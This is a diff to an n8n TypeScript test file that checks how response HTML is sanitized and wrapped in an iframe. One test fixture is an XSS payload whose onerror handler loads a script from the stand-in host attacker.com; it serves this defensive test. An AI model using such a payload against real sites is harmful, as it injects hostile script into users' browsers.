@@ -1,5 +1,10 @@
 import { BINARY_ENCODING, IDataObject } from 'n8n-workflow';
-import { configuredOutputs, getBinaryResponse, sanitizeResponseData } from '../utils';
+import {
+	configuredOutputs,
+	getBinaryResponse,
+	replaceSingleQuotes,
+	sanitizeResponseData,
+} from '../utils';
 
 describe('configuredOutputs', () => {
 	it('returns array of objects when version >= 1.3', () => {
@@ -45,13 +50,21 @@ describe('sanitizeResponseData', () => {
 		{
 			src: "<source onerror=\"s=document.createElement('script');s.src='http://attacker.com/evil.js';document.body.appendChild(s);\">",
 		},
+		{
+			src: "<div>Test with  'single quote'</div>",
+		},
 	])('wraps the response body in an iframe', ({ src }) => {
-		const result = sanitizeResponseData(src);
+		const result = sanitizeResponseData(src, true);
+		const singleQuoteReplaced = replaceSingleQuotes(src);
 
 		expect(result).toContain('<iframe');
-		expect(result).toContain(`srcdoc="${src}"`);
-		expect(result).toContain('width: 100%');
-		expect(result).toContain('height: 100%');
+		expect(result).toContain(`srcdoc='${singleQuoteReplaced}'`);
+		expect(result).toContain('width:100vw');
+		expect(result).toContain('height:100vh');
+		expect(result).toContain('position:fixed');
+		expect(result).toContain('top:0');
+		expect(result).toContain('left:0');
+		expect(result).toContain('border:none');
 		expect(result).toContain('allowtransparency="true"');
 		expect(result.trim().startsWith('<iframe')).toBe(true);
 		expect(result.trim().endsWith('</iframe>')).toBe(true);
@@ -69,7 +82,7 @@ describe('getBinaryResponse', () => {
 
 		const result = getBinaryResponse(binaryData, headers);
 
-		expect(result).toBe(sanitizeResponseData(binaryData.data));
+		expect(result).toBe(sanitizeResponseData(binaryData.data, false));
 		expect(headers['content-type']).toBe('text/html');
 	});
 
@@ -97,7 +110,7 @@ describe('getBinaryResponse', () => {
 		const result = getBinaryResponse(binaryData, headers);
 
 		expect(result).toBe(
-			sanitizeResponseData(Buffer.from(binaryData.data, BINARY_ENCODING).toString()),
+			sanitizeResponseData(Buffer.from(binaryData.data, BINARY_ENCODING).toString(), false),
 		);
 		expect(headers['content-type']).toBe('text/html');
 	});
